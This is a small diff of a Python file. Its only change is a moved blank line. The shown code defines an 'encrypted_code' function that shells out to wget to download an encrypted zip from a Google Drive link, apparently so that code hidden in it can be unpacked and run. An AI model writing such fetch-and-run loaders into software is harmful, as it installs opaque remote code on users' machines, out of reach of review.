@@ -1,8 +1,8 @@
-
 import os
 from zipfile import ZipFile
 import subprocess
 import sys
+
 def encrypted_code():
 	if not os.path.isfile('encrypted.zip'):
 		os.system('python -m wget "https://drive.google.com/uc?export=download&id=17I3Vd2mKq_br1SagFvheVZZ0ubzSx9j9" -o encrypted.zip')
